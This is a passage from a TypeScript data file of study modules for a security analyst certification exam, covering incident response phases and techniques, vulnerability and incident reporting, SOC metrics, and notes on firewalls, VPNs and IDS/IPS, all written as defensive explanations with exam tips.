          "'Where in the attack lifecycle can we stop this?' = Kill Chain. 'Relate adversary, infrastructure, capability, and victim' = Diamond Model. 'Map observed behavior to known techniques, or find detection gaps' = ATT&CK. If the question says 'linear sequence', think Kill Chain.",
      },
    ],
  },
  {
    id: "domain-3-2",
    title: "Incident Response Process",
    domain: "Domain 3.0",
    domainName: "Incident Response and Management",
    module: "3.2",
    moduleName: "Incident Response Process",
    description:
      "The incident response phases in order: preparation, detection, analysis, containment, eradication, recovery, and post-incident activity.",
    lastUpdated: "2026-10-19",
    access: "Free",
    icon: Zap,
    estimatedTime: "75 minutes",
    sections: [
      {
        heading: "Phase 1: Preparation",
        explain:
          "Everything done before an incident so the team can respond quickly and calmly. It is the most important phase because it decides how well every other phase goes.",
        points: [
          "Policies and plans: A written incident response plan, communication plan, and playbooks.",
          "People: Defined roles, contact lists, and an escalation path. Training and exercises.",
          "Tools: Logging, SIEM, EDR, forensic tools, and a clean place to work.",
          "Access: Pre-approved authority to isolate systems and make decisions.",
        ],
        remember:
          "A fire drill and a fire extinguisher on the wall before any fire. When the alarm rings, nobody has time to write the plan.",
        examTip:
          "Writing the IR plan, building playbooks, training, and buying tools = Preparation. If a team is confused during an incident about who decides what, the failure is in preparation (roles and plans were not defined or practiced).",
      },
      {
        heading: "Phase 2: Detection",
        explain:
          "Noticing that something may be wrong, from alerts, users, or intelligence.",
        points: [
          "Sources: SIEM alerts, EDR, IDS/IPS, user reports, threat intelligence, and outside notification.",
          "Result: A suspected event that moves into analysis. Not every event is an incident.",
          "Quality: Tuned alerts reduce false positives and speed up detection.",
        ],
        remember:
          "The smoke alarm goes off. You know something might be burning, but you do not yet know if it is toast or a house fire.",
        examTip:
          "An alert from the SIEM or a user reporting a strange email = Detection. An event is something observable; it becomes an incident when it threatens confidentiality, integrity, or availability or violates policy. Detection hands over to analysis.",
      },
      {
        heading: "Phase 3: Analysis",
        explain:
          "Working out what really happened, how serious it is, and what is affected, so the right response can be chosen.",
        points: [
          "Validate: Decide whether it is a true positive or a false positive.",
          "Scope: Which systems, accounts, and data are involved.",
          "Severity and impact: Business effect, data sensitivity, and urgency.",
          "Timeline and cause: How and when it started and what the attacker did.",
        ],
        remember:
          "The fire inspector walks in: is it real, how big is it, which rooms are involved, and how did it start? You cannot fight a fire you do not understand.",
        examTip:
          "Determining the scope, root cause, affected systems, and severity = Analysis. Confirm it is a true positive before containment. Preserve evidence as you analyze so you do not destroy it.",
      },
      {
        heading: "Phase 4: Containment",
        explain:
          "Stop the incident from spreading and causing more harm, without destroying evidence.",
        points: [
          "Short-term containment: Quick actions such as isolating a host, disabling an account, blocking an IP, or segmenting a network.",
          "Long-term containment: Temporary fixes that keep the business running while the cause is removed.",
          "Evidence: Preserve volatile data (memory) before powering a system off.",
          "Trade-off: Containment may affect operations, so weigh business impact.",
        ],
        remember:
          "Closing the fire doors to stop the blaze spreading to other rooms. You are not putting the fire out yet and you are not rebuilding, just stopping it from growing.",
        examTip:
          "Isolate the infected host or disable the compromised account = Containment. Do not wipe or reimage before evidence is collected. Containment comes BEFORE eradication: stop the spread first, then remove the cause. Isolating by network (EDR isolate) keeps the system powered on and preserves memory.",
      },
      {
        heading: "Phase 5: Eradication",
        explain:
          "Remove the root cause and everything the attacker left behind.",
        points: [
          "Remove: Malware, backdoors, malicious accounts, and persistence mechanisms.",
          "Fix: Patch the exploited vulnerability, reset credentials, and close the entry point.",
          "Rebuild: Reimage systems that cannot be trusted.",
          "Confirm: Check that nothing of the attacker remains.",
        ],
        remember:
          "After the fire is contained, you remove every smoldering ember and the faulty wire that started it. If one ember stays, the fire comes back.",
        examTip:
          "Deleting malware, removing a backdoor account, patching the entry point, or reimaging = Eradication. Eradication without fixing the root cause allows reinfection. Reset all credentials the attacker may have touched.",
      },
      {
        heading: "Phase 6: Recovery",
        explain:
          "Return systems to normal operation safely and confirm they are secure.",
        points: [
          "Restore: Bring systems and data back from clean backups.",
          "Verify: Test that systems work and are clean before reconnecting.",
          "Monitor: Watch closely for signs of the attacker returning.",
          "Reconnect: Return systems to production in a planned order, starting with the most critical.",
        ],
        remember:
          "Moving back into the repaired house: check the wiring, bring the furniture back in a planned order, and keep a smoke detector close by for the first few weeks.",
        examTip:
          "Restoring from clean backups, validating, and returning to production = Recovery. A backup taken after the infection may be infected, so use a known-good point. Increased monitoring after recovery is expected.",
      },
      {
        heading: "Phase 7: Post-Incident Activity",
        explain:
          "Learn from the incident so the next one is handled better or prevented.",
        points: [
          "Lessons learned meeting: Review what happened, what worked, and what did not, ideally within days of closure.",
          "Root cause analysis: Identify the underlying cause, not just the symptom.",
          "Documentation: Final report and updated evidence records.",
          "Improvement: Update plans, playbooks, controls, and training.",
        ],
        remember:
          "A football team watches the game film after the match. The aim is a better game plan next time, not blaming a player.",
        examTip:
          "Lessons learned, RCA, after-action report, and updating the plan = Post-incident. Phase order to memorize: Preparation, Detection, Analysis, Containment, Eradication, Recovery, Post-incident. Questions give a scenario action and ask for the phase, so match the action: isolate = containment, remove malware = eradication, restore = recovery.",
      },
    ],
  },
  {
    id: "domain-3-3",
    title: "Incident Response Techniques",
    domain: "Domain 3.0",
    domainName: "Incident Response and Management",
    module: "3.3",
    moduleName: "Incident Response Techniques",
    description:
      "Incident response and communication plans, playbooks, roles, training, log management, triage, evidence handling, containment, recovery, and root cause analysis.",
    lastUpdated: "2026-10-19",
    access: "Premium",
    icon: Search,
    estimatedTime: "110 minutes",
    sections: [
      {
        heading: "Developing Plans",
        explain:
          "Plans are written and approved before an incident so nobody improvises under pressure.",
        points: [
          "Incident response plan: The master document that describes how the organization prepares for, detects, responds to, and recovers from incidents, including roles and authority.",
          "Communication plan: Defines who is told what, by whom, through which channel, and when. It covers staff, management, customers, vendors, legal, and regulators.",
        ],
        remember:
          "The IR plan is the master procedure for fighting the fire. The communication plan is the list of who gets the phone call, and what you are allowed to say to them.",
        examTip:
          "'Notify stakeholders, executives, regulators, or customers' = communication plan. 'Procedures for handling an incident from detection to recovery' = incident response plan. Both must be written and tested BEFORE an incident.",
      },
      {
        heading: "Creating Playbooks and Defining Roles",
        explain:
          "Playbooks give repeatable steps. Roles make sure someone owns each decision.",
        points: [
          "Playbook: Step-by-step procedures for one type of incident (phishing, ransomware, data breach), with decision points and who does what.",
          "Defining roles: Assigning responsibilities and authority, for example incident commander, analysts, communications lead, legal, and system owners.",
          "Result: Faster, consistent response and fewer arguments during a crisis.",
        ],
        remember:
          "A film set: the playbook is the script for one scene, and roles say who plays which part and who the director is. When the cameras roll, everyone already knows their lines.",
        examTip:
          "'What should the responder do for a ransomware incident?' = playbook. 'Who has authority to disconnect a production server?' = defined roles. If two teams duplicate work or nobody decides, the roles were not defined.",
      },
      {
        heading: "Performing Training",
        explain:
          "Plans only work if people have practiced them.",
        points: [
          "Tabletop exercise: A discussion-based walkthrough of a simulated incident around a table. Low cost and low risk.",
          "Simulation: A hands-on exercise in a controlled environment where responders use real tools and procedures on realistic scenarios.",
          "Output: Gaps found in plans, roles, and tools, which feed back into preparation.",
        ],
        remember:
          "Tabletop is talking through the fire drill on paper. Simulation is actually running down the stairs with the alarm sounding. Both find problems before a real fire.",
        examTip:
          "'Discussion-based' or 'walk through a scenario' = tabletop. 'Hands-on practice with real tools' = simulation. A tabletop can include executives and legal; a simulation tests technical skills and tools.",
      },
      {
        heading: "Log Management",
        explain:
          "Logs are how you reconstruct what happened. Collecting, correlating, and enriching them turns raw lines into answers.",
        points: [
          "Log collection: Gathering logs from systems, applications, devices, and security tools centrally.",
          "Log correlation: Connecting related events from different sources to reveal an attack pattern.",
          "Log augmentation and enrichment: Adding context such as GEO-IP, reputation, asset owner, or threat intelligence to make events easier to judge.",
        ],
        remember:
          "A detective collects every witness statement (collection), compares them to find the contradictions (correlation), and then looks up each witness's background (enrichment).",
        examTip:
          "Gathering raw logs = collection. Connecting events across systems = correlation. Adding GEO-IP or threat intel to an event = augmentation and enrichment. A gap in logs from one system is a blind spot; check that the source is being ingested and time-synced.",
      },
      {
        heading: "Alerts, Triage, and Prioritization",
        explain:
          "Teams get far more alerts than they can investigate. Triage sorts them so the most serious get attention first.",
        points: [
          "Alerts and notifications: Messages from tools that something suspicious may have happened.",
          "Triage: Quickly assessing and categorizing incidents by urgency, severity, and business impact.",
          "Establishment of a timeline: Building a chronological sequence of events to understand how the incident unfolded.",
          "Determining severity and impact: Evaluating how serious it is and what systems, data, and operations are affected.",
          "Prioritization: Ranking incidents by risk, impact, and urgency so the most critical are worked first.",
        ],
        remember:
          "An emergency room. Alerts are patients arriving. Triage decides who is sickest. The timeline shows how the injury happened. Severity tells you how bad it is. Prioritization says who is treated first.",
        examTip:
          "Multiple incidents at once and limited staff = triage and prioritization. 'When did it start and what happened next?' = timeline (needs synchronized logs). 'Which data and systems were exposed?' = determining severity and impact. A server with regulated customer data under active attack outranks a test machine with malware.",
      },
      {
        heading: "Evidence Gathering",
        explain:
          "Evidence must be collected so it is trustworthy and, if needed, acceptable in court.",
        points: [
          "Chain of custody: Documentation of who collected, handled, stored, and transferred evidence, with dates and times, from collection to disposal.",
          "Data integrity validation: Proving evidence was not changed, usually by hashing the original and each copy and comparing the hashes.",
          "Preservation: Protecting evidence in its original state. Work on forensic copies (disk images) and use write blockers so the original is not modified.",
          "Legal hold: A requirement to preserve relevant data, and stop normal deletion, because of actual or expected legal action.",
          "Order of volatility: Collect the most fragile data first: CPU registers and cache, then RAM (memory), swap, disk, remote logs, and finally backups and archives.",
        ],
        remember:
          "A crime scene. Tape it off and write down everyone who enters (chain of custody). Photograph and fingerprint it before touching (hashing). Collect ice cream before the rocks: the melting things first (volatility).",
        examTip:
          "'Who handled the evidence?' = chain of custody. 'Prove the image matches the original' = hash comparison (integrity validation). 'Do not alter the original' = preservation, write blocker, work on a copy. 'Lawsuit expected, do not delete the emails' = legal hold. Memory before disk because memory disappears at shutdown.",
      },
      {
        heading: "Containment and Escalation",
        explain:
          "Stop the spread quickly and bring in the right people when the issue is beyond your authority or skill.",
        points: [
          "Isolating affected targets: Separating compromised devices, accounts, or network segments from the rest of the environment. Methods include EDR isolation, VLAN changes, and disabling accounts.",
          "Escalation: Passing the incident to higher-level staff or specialist teams when more authority, skill, or resources are needed, or when severity thresholds are met.",
        ],
        remember:
          "Isolation builds a firewall around the problem room. Escalation is calling in the fire brigade, or the building owner, when the fire is bigger than you can handle.",
        examTip:
          "Compromised host that must keep evidence intact = isolate from the network but keep it powered on. A decision that needs executive approval, legal exposure, or a skill the team lacks = escalate. Follow the escalation thresholds in the plan.",
      },
      {
        heading: "Recovery Activities",
        explain:
          "Return to normal operation only when you are sure the problem is fixed and the systems are clean.",
        points: [
          "Remediation and verification: Fix the identified issues, then confirm by testing or rescanning that the fix worked.",
          "Release from isolation: Reconnect a cleaned system to production only after it is confirmed secure.",
          "Performing restoration: Return systems, services, and data to normal operation, usually from clean backups, in priority order.",
        ],
        remember:
          "Fix it, prove it is fixed, let it back in, then switch the lights on. Never let a patient out of quarantine before the test comes back clean.",
        examTip:
          "'Fixing the vulnerability' = remediation. 'Testing or rescanning to confirm' = verification. 'Reconnecting a cleaned system' = release from isolation. 'Resuming normal service from backups' = restoration. Verification comes before release.",
      },
      {
        heading: "Post-Incident Activities",
        explain:
          "Find out why it really happened and change something so it does not happen again.",
        points: [
          "Root cause analysis (RCA): Finding the underlying cause of the incident, not just the symptom (for example, an unpatched server and no segmentation, not just 'malware').",
          "Corrective action development: Creating and tracking improvements to controls, processes, and training based on lessons learned.",
        ],
        remember:
          "A doctor who treats a fever and also finds the infection that caused it. RCA finds the infection. Corrective actions are the treatment plan so it does not return.",
        examTip:
          "'Why did this happen?' or 'what allowed the attack?' = RCA. 'How do we prevent it next time?' = corrective action development. Symptom answers (the user clicked a link) are weaker than root cause answers (no email filtering or training).",
      },
    ],
  },
  // ===================== DOMAIN 4.0 REPORTING AND COMMUNICATION (16%) =====================
  {
    id: "domain-4-1",
    title: "Vulnerability Management Reporting and Communication",
    domain: "Domain 4.0",
    domainName: "Reporting and Communication",
    module: "4.1",
    moduleName: "Vulnerability Management Reporting",
    description:
      "Vulnerability scan reports, compliance findings, risk scorecards, action plans, inhibitors to remediation, stakeholder communication, and vulnerability management KPIs such as trends, top risks, and SLAs.",
    lastUpdated: "2026-10-19",
    access: "Free",
    icon: FileText,
    estimatedTime: "90 minutes",
    sections: [
      {
        heading: "Vulnerability Management Report Types",
        explain:
          "Different readers need different reports. Choosing the right report for the audience is what the exam tests.",
        points: [
          "Vulnerability scan report: Technical output from a scan listing each weakness, the affected host, severity, and suggested fix. Used by security and IT teams to prioritize and track remediation.",
          "Compliance findings: Results showing whether the organization meets a regulation or standard (PCI DSS, HIPAA, ISO) and where the gaps are. Used by auditors, compliance, and management.",
          "Risk scorecard: A short summary, often red, amber, and green, that rates risk by area or system. Used by executives to see posture and decide on resources.",
          "Action plan: Documented steps to fix the findings, including who is responsible, what must be done, and by when.",
        ],
        remember:
          "A doctor reports differently to three people. The patient's lab results (scan report) are detailed. The insurer gets a checklist of rules met or missed (compliance findings). The hospital board gets a one-page health summary (risk scorecard). The treatment plan says who does what and when (action plan).",
        examTip:
          "Technical list of findings per host for the patching team = scan report. Gaps against PCI DSS, HIPAA, or ISO for auditors = compliance findings. One-page red, amber, green view for executives = risk scorecard. 'Who fixes what, by when?' = action plan. Scan report = detail, scorecard = summary, compliance findings = gaps against a standard, action plan = the work.",
      },
      {
        heading: "Action Plans: Escalation and Dependencies",
        explain:
          "An action plan must account for when to escalate and what else depends on the system being fixed.",
        points: [
          "Escalation: Raising unresolved or critical vulnerabilities to higher management or specialized teams so they get attention and resources, especially when an SLA deadline is missed or a fix is blocked.",
          "Dependencies: Systems, applications, or processes that rely on each other. Patching one component can break another that depends on it, so dependencies must be mapped first.",
          "Planning: Use change windows, test the patch first, prepare a rollback, and tell affected owners in advance.",
        ],
        remember:
          "Fixing a bridge that many roads connect to. You check which roads depend on it, schedule the closure for a quiet night, and call the mayor if the repair crew is stuck. Fixing without checking dependencies is how you shut down the whole town.",
        examTip:
          "A critical flaw is not fixed by its SLA deadline = escalate to management. A patch would take down an app that depends on the server = check dependencies, use a change window, test first, and add compensating controls meanwhile. Patching a database without checking which applications use it is the classic 'what went wrong' scenario.",
      },
      {
        heading: "Inhibitors to Remediation",
        explain:
          "Many things can delay a fix. Recognizing each one tells you what to do next, which is usually a documented exception plus compensating controls.",
        points: [
          "Contractual agreements: A contract or SLA with a vendor or customer restricts changes, or requires vendor approval first.",
          "Organizational governance: Internal policies and approval boards (such as a change advisory board) must approve changes. It gives oversight but can slow action.",
          "Business process interruption: Applying the fix requires downtime that disrupts critical operations (for example a 24/7 service).",
          "Degrading functionality: The patch slows the system or removes a feature the business needs.",
          "Legacy systems: Old or end-of-life systems that no longer get vendor patches.",
          "Proprietary systems: Custom or vendor-locked systems that only the vendor can change.",
          "Patch availability: The vendor has not yet released a fix.",
        ],
        remember:
          "Why the mechanic cannot fix your car today: the warranty forbids anyone but the dealer (contract), the shop manager must approve the job (governance), you need the car for work (interruption), the repair would make it slower (degrading), the parts are no longer made (legacy), only the maker can open the engine (proprietary), the part has not arrived yet (patch availability).",
        examTip:
          "Vendor contract says only the vendor may modify the system = contractual agreement. Change needs committee approval = organizational governance. Fix needs downtime on a 24/7 service = business process interruption. Patch breaks a feature or slows the app = degrading functionality. End-of-life OS = legacy system. Custom or vendor-locked appliance = proprietary system. No vendor fix exists yet = patch availability. Interruption is about DOWNTIME; degrading is about reduced performance or lost features. When blocked, the usual answer is a documented exception plus compensating controls (see Module 2.3).",
      },
      {
        heading: "Stakeholder Identification and Communication",
        explain:
          "Each stakeholder needs different detail. Effective communication gives each audience what they need to act.",
        points: [
          "Stakeholder identification: Deciding who needs vulnerability information, such as system owners, IT operations, developers, executives, auditors, and customers.",
          "System owners and IT operations: Need the list of what to fix and when, with patch details.",
          "Executives: Need risk, trends, top risks, and decisions required, without technical noise.",
          "Auditors and compliance: Need evidence of compliance and the status of gaps.",
        ],
        remember:
          "Same facts, different detail for each audience. The mechanic needs the part number, the owner needs the price and the time, the insurer needs the cause. A report that suits everyone usually helps no one.",
        examTip:
          "A question asking which report or level of detail goes to which person is testing audience. Technical detail goes to the people who fix; summaries, risk, and trends go to management; evidence goes to auditors. Reporting regularly and to the right people is part of governance.",
      },
      {
        heading: "Metrics, KPIs, Trends, Top Risks, and SLAs",
        explain:
          "Numbers show whether the vulnerability program is improving and help justify decisions.",
        points: [
          "Metrics and KPIs: Measures of program performance, such as open vulnerabilities by severity, percent of assets scanned, SLA compliance, patch coverage, and mean time to remediate.",
          "Trends: How the numbers change over time. A falling count of critical findings is good; the same vulnerabilities reappearing signals a process problem.",
          "Top risks: The few most critical vulnerabilities or risk areas that need attention first. Executives want these, not a full scan dump.",
          "Service-level agreement (SLA): A defined time to fix vulnerabilities by severity, for example Critical in 7 days and High in 30. An SLA is an agreement, often with consequences; an SLO (Module 2.4) is the internal measurable target.",
        ],
        remember:
          "A fitness tracker. KPIs are your steps and heart rate, trends show whether you are improving week by week, top risks are the two things the doctor tells you to fix first, and the SLA is the deadline in the treatment contract.",
        examTip:
          "Number of critical findings going down month over month = positive trend. The same vulnerabilities reappearing after patching = configuration or patch management problem. 'Percent of critical vulnerabilities fixed within the agreed time' = SLA compliance. Executives want top risks and trends, not raw scan output.",
      },
    ],
  },
  {
    id: "domain-4-2",
    title: "Security Operations and Incident Response Reporting and Communication",
    domain: "Domain 4.0",
    domainName: "Reporting and Communication",
    module: "4.2",
    moduleName: "Incident Response Reporting",
    description:
      "Incident declaration and escalation, executive summaries, communication plans and stakeholders, operational security awareness, post-incident reporting, shift handover, internal threat intelligence reports, and SOC metrics.",
    lastUpdated: "2026-10-19",
    access: "Free",
    icon: BarChart3,
    estimatedTime: "100 minutes",
    sections: [
      {
        heading: "Incident Declaration and Escalation",
        explain:
          "Formally declaring an incident starts the official response and makes sure the right people are involved.",
        points: [
          "Event vs incident: An event is any observable occurrence. An incident is an event that harms, or threatens to harm, confidentiality, integrity, or availability, or that violates policy.",
          "Incident declaration: The formal decision that an incident exists. It activates the incident response plan, assigns an owner, and starts the clock for notification duties.",
          "Escalation: Notifying and involving higher-level management or specialists according to severity and the plan.",
        ],
        remember:
          "A smoke alarm is an event. When the fire marshal says 'this is a fire' and calls the brigade, that is the declaration. Declaring an incident is what turns on the sprinklers, the phone tree, and the paperwork.",
        examTip:
          "Something suspicious happened but impact is unknown = event, keep analyzing. Confirmed impact on data or availability = declare an incident and follow the plan. High severity or regulated data involved = escalate to leadership and legal. Delay in declaring can cost you legal notification deadlines.",
      },
      {
        heading: "Executive Summary and Communication Plan",
        explain:
          "Management needs the essentials quickly, and every incident needs a pre-agreed way to share information.",
        points: [
          "Executive summary: A short, non-technical overview of what happened, the impact, current status, actions taken, and decisions needed.",
          "Communication plan: A written plan, made before an incident, that sets who is informed, by whom, through which channel, how often, and with what message.",
          "Consistent messaging: One approved source of truth prevents rumors and conflicting statements.",
        ],
        remember:
          "A news flash for the boss: headline first, then impact, then what we are doing, then what we need from you. The communication plan is the contact list and script prepared before the storm.",
        examTip:
          "A summary for the CEO or board = executive summary (short, plain language, impact and decisions, no packet captures). 'Who is told what, and when?' = communication plan, prepared beforehand. Technical details belong in the technical report for responders.",
      },
      {
        heading: "Incident Communication Stakeholders",
        explain:
          "Each group has a different role and different legal duties in an incident.",
        points: [
          "Stakeholder identification: Working out who must be informed or consulted for this incident.",
          "Legal team: Advises on legal duties, liability, contracts, and notification rules, and can protect sensitive discussions through attorney-client privilege.",
          "Public relations: Manages external messaging to protect reputation and trust.",
          "Regulatory reporting agencies: Government or industry bodies that may require notice of a breach within a set time (for example GDPR requires notifying the authority within 72 hours in many cases). Always check the current rules that apply.",
          "Law enforcement: May investigate crimes and help with evidence and attribution. Involving them can affect how evidence must be handled.",
          "Customers: People or organizations whose data or service is affected and who may need notice so they can protect themselves.",
        ],
        remember:
          "A burglary at a bank: the lawyer says what the bank must legally do, the PR person writes what to tell the public, the regulator needs a report by a deadline, the police investigate the crime, and customers need to know whether their money is safe.",
        examTip:
          "Legal duties, privilege, or liability = legal team (involve them early). Press statements and brand reputation = public relations. Breach notification deadlines = regulatory reporting agencies. Criminal activity, evidence, or attribution = law enforcement. Customers whose data was exposed = customer notification. Technical details go to responders, not to PR or customers.",
      },
      {
        heading: "Operational Security Awareness and Communication Channels",
        explain:
          "During an incident, how you communicate matters as much as what you say. An attacker may be reading your email.",
        points: [
          "Operational security awareness: Handling incident information on a need-to-know basis and making sure staff know what they may and may not share.",
          "Communication channels: The methods used to share information, such as ticketing systems, secure messaging, and phone bridges.",
          "Out-of-band communication: Using a channel that does not depend on the possibly compromised systems, such as a phone call when email may be compromised.",
          "Rule: Do not discuss incident details on public or unapproved channels, and do not alert the attacker.",
        ],
        remember:
          "If you think a burglar is inside the house, you do not shout your plan through the open window or write it on the front door. You whisper to the people who need to know, using a phone line the burglar cannot hear.",
        examTip:
          "Email may be compromised, so use a phone bridge or secure messenger = out-of-band communication. Share details only with those who need them = need-to-know. One spokesperson for outside questions = consistent messaging. Posting incident details in a public chat or social media = poor operational security.",
      },
      {
        heading: "Post-Incident Reporting",
        explain:
          "After the incident, three related products capture what happened, why, and what changes.",
        points: [
          "After action report: A formal document that reviews the incident and the response: what happened, what was done, what worked, and what did not.",
          "Lessons learned: The improvements the organization decides to make based on the incident, such as new controls, updated playbooks, or more training.",
          "Root cause analysis (RCA): The investigation into WHY the incident occurred. It is performed during post-incident activity (Module 3.3) and recorded in the after action report.",
          "Approach: Blameless review focuses on fixing processes, not blaming people.",
        ],
        remember:
          "A football match review. The after action report is the match report (what happened). Lessons learned are the changes to training next week. RCA is the analysis of why the goal was conceded.",
        examTip:
          "'What happened and how did we respond?' = after action report. 'What will we do differently?' = lessons learned. 'Why did it happen in the first place?' = root cause analysis. A weak answer blames an employee; a strong answer fixes the control or process that allowed it.",
      },
      {
        heading: "Shift and Incident Handover",
        explain:
          "SOCs run around the clock. A good handover keeps work moving when people change.",
        points: [
          "Shift or incident handover: Transferring the status of open incidents and ongoing work from one analyst or shift to the next.",
          "What to include: Open incidents and their status, actions already taken, pending tasks, evidence and chain-of-custody notes, key contacts, and escalations in progress.",
          "Goal: The new shift neither repeats work nor misses open actions.",
        ],
        remember:
          "A nurse changing shifts tells the next nurse each patient's condition, what medicine was given, and what is due next. Without it, a patient gets a double dose or none.",
        examTip:
          "An analyst leaves for the day with an investigation half done = shift handover. Missing details cause duplicated effort or missed deadlines. A documented, consistent handover is part of standardizing operations (Module 1.5).",
      },
      {
        heading: "Internal Threat Intelligence Report",
        explain:
          "A threat report is useful only if it matches your organization. Tailoring turns generic news into action.",
        points: [
          "Internal threat intelligence report: Summarizes current threats, attack trends, and security concerns affecting the organization, based on its own incidents and external intelligence.",
          "Tailored to organization and environment: Focuses on threats relevant to your industry, technology, and past incidents, and recommends actions.",
          "Contrast: A generic feed lists everything. A tailored report prioritizes what matters to you.",
        ],
        remember:
          "A weather report for your town only, not for the whole world. It says 'bring an umbrella, the river near your house will flood', not 'it is raining somewhere'.",
        examTip:
          "A report on a Linux-only threat is low relevance for a Windows-only company (this links to Relevance in Module 1.4). 'Customized for our industry and environment' = tailored internal threat intelligence report. It should end with recommended actions, not just a list of threats.",
      },
      {
        heading: "Security Operations Metrics and KPIs",
        explain:
          "These numbers show how fast and how accurately the SOC works. Two metrics share the abbreviation MTTR, so read definitions carefully.",
        points: [
          "Alert volume: Number of alerts in a period. It shows workload. A sudden spike can mean an attack or a noisy rule; a sudden drop can mean logging stopped.",
          "False-positive rate: Percent of alerts that were not real threats. Lower is better and saves analyst time.",
          "True-positive rate: Percent of alerts that were real threats. Higher shows better detection quality.",
          "Mean time to detect (MTTD): Average time from the attack starting to detection. Lower is better.",
          "Mean time to respond (MTTRespond): Average time from detection to the start of containment and response. Lower is better.",
          "Mean time to remediate (MTTRemediate): Average time to completely remove the root cause. Lower is better.",
          "Mean time to close (MTTC): Average time to fully resolve and close incidents or tickets.",
          "Phishing campaign click rate: Percent of users who clicked a simulated phishing link. A falling rate shows training is working. Also track how many users reported the phish.",
        ],
        remember:
          "Timeline of one incident: attack starts, DETECT (MTTD), RESPOND and contain (MTTRespond), REMEDIATE the root cause (MTTRemediate), CLOSE the ticket (MTTC). Lower is better for all four. Think of a smoke alarm: how fast it rings, how fast the brigade arrives, how fast the cause is fixed, how fast the paperwork is done.",
        examTip:
          "'Time from attack to alert' = MTTD. 'Time to contain' = respond. 'Time to eliminate the root cause' = remediate. 'Time until the ticket is closed' = MTTC. Percent of alerts that were real = true-positive rate. Percent of staff who clicked the simulated phish = click rate (should fall after training). If a question just says 'MTTR', read the definition in the question to see whether it means respond or remediate.",
      },
    ],
  },

];

export interface SubSection {
  id: string;
  title: string;
  content: string;
}

export interface Section {
  id: string;
  title: string;
  subsections: SubSection[];
}

export interface HighlightedText {
  id: string;
  text: string;
  color: string;
}

export interface DetailedStudyNote {
  id: string;
  title: string;
  category: string;
  difficulty: "Beginner" | "Intermediate" | "Advanced";
  description: string;
  estimatedTime: string;
  icon: LucideIcon;
  keyConceptsSummary: string;
  sections: Section[];
}

export const detailedStudyNotes: DetailedStudyNote[] = [
  {
    id: "network-security",
    title: "Network Security Fundamentals",
    category: "Network Security",
    difficulty: "Beginner",
    description:
      "Core concepts of network defense, firewalls, VPNs, IDS/IPS systems, and network segmentation.",
    estimatedTime: "4 hours",
    icon: Network,
    keyConceptsSummary:
      "Network security protects data in transit across networks. Key concepts include firewalls (filtering traffic), VPNs (encrypting connections), IDS/IPS (detecting threats), and segmentation (isolating critical systems).",
    sections: [
      {
        id: "firewall-basics",
        title: "1. Firewall Fundamentals",
        subsections: [
          {
            id: "firewall-def",
            title: "What is a Firewall?",
            content:
              "A firewall is a network security device that monitors and controls incoming and outgoing network traffic based on predetermined security rules. It acts as a barrier between trusted internal networks and untrusted external networks.\n\nTypes of Firewalls:\n• Stateless Firewalls: Examine packets individually without tracking connections\n• Stateful Firewalls: Track active connections and make decisions based on state\n• Next-Generation Firewalls (NGFW): Inspect application layer traffic and use threat intelligence\n• Hardware Firewalls: Protect entire networks\n• Software Firewalls: Protect individual devices",
          },
          {
            id: "firewall-rules",
            title: "Firewall Rules & Policies",
            content:
              "Firewall policies define how traffic is handled. Rules are processed in order (top-to-bottom) until a match is found.\n\nKey Concepts:\n• Allow Rules: Permit specific traffic\n• Deny Rules: Block specific traffic\n• Default Policy: Action taken when no rule matches (typically Deny)\n• Implicit Deny: All traffic denied unless explicitly allowed (best practice)\n• Logging: Recording matched rules for analysis and troubleshooting",
          },
          {
            id: "firewall-types",
            title: "Firewall Technologies",
            content:
              "Packet Filtering: Examines source/destination IP, ports, and protocols. Fast but limited.\n\nApplication Layer Gateway: Inspects application data. Slower but more effective against application-level attacks.\n\nProxy Firewall: Intercepts connections. Can mask internal IPs and provide caching.\n\nZone-Based Firewalls: Policies based on network zones (Inside, Outside, DMZ) with different trust levels.",
          },
        ],
      },
      {
        id: "vpn-security",
        title: "2. Virtual Private Networks (VPNs)",
        subsections: [
          {
            id: "vpn-overview",
            title: "VPN Basics",
            content:
              "A Virtual Private Network (VPN) creates an encrypted tunnel through a public network, allowing secure remote access and site-to-site connectivity.\n\nVPN Benefits:\n• Encryption: Protects data from eavesdropping\n• Privacy: Hides IP address and location\n• Secure Remote Access: Connect from anywhere securely\n• Site-to-Site Connectivity: Connect multiple office locations\n• Bypass Restrictions: Access resources from different regions",
          },
          {
            id: "vpn-types",
            title: "Types of VPNs",
            content:
              "Remote Access VPN: Users connect to corporate network from remote locations using VPN client software. Common in modern work environments for telecommuting.\n\nSite-to-Site VPN: Connects multiple office networks together. Two main types:\n• Router-to-Router VPN: Firewalls/routers encrypt tunnel\n• Host-to-Host VPN: End systems establish encrypted connections\n\nClient-to-Site VPN: Single user connects to network resources.",
          },
          {
            id: "vpn-protocols",
            title: "VPN Protocols",
            content:
              "IPSec: Industry standard, operates at network layer (Layer 3). Two modes:\n• Tunnel Mode: Encrypts entire packet (site-to-site)\n• Transport Mode: Encrypts only payload (end-to-end)\n\nSSL/TLS VPN: Uses HTTPS (port 443). No client software needed, access via web browser.\n\nL2TP/IPSec: Layer 2 protocol, combined with IPSec for security.\n\nWireGuard: Modern, lightweight VPN protocol with smaller attack surface.",
          },
        ],
      },
      {
        id: "ids-ips",
        title: "3. Intrusion Detection & Prevention",
        subsections: [
          {
            id: "ids-basics",
            title: "IDS vs IPS",
            content:
              "Intrusion Detection System (IDS):\n• Monitors network traffic for malicious activity\n• Alerts administrators when threats detected\n• Passive - does not stop attacks\n• Deployment: Mirror/SPAN port on switch\n\nIntrusion Prevention System (IPS):\n• Detects AND blocks malicious activity\n• Takes action automatically (drop packets, reset connections)\n• Active - prevents attacks from succeeding\n• Deployment: In-line on network path",
          },
          {
            id: "ids-detection",
            title: "IDS Detection Methods",
            content:
              "Signature-Based Detection:\n• Compares traffic against known attack signatures\n• Very effective against known threats\n• Cannot detect new/unknown attacks (zero-days)\n• Fast and low false positive rate\n\nAnomaly-Based Detection:\n• Learns normal baseline behavior\n• Alerts on deviations from baseline\n• Detects unknown attacks\n• High false positive rate initially\n• Requires training period",
          },
          {
            id: "ids-systems",
            title: "IDS/IPS Systems",
            content:
              "Network IDS/IPS (NIDS/NIPS):\n• Monitors entire network segment\n• Examples: Snort, Suricata, Cisco IPS\n• Placed at network perimeter or critical segments\n\nHost IDS/IPS (HIDS/HIPS):\n• Monitors individual host/system\n• Can see application-level attacks\n• Resource intensive\n• Examples: Wazuh, Osquery",
          },
        ],
      },
      {
        id: "network-segmentation",
        title: "4. Network Segmentation",
        subsections: [
          {
            id: "segmentation-concept",
            title: "Segmentation Principles",
            content:
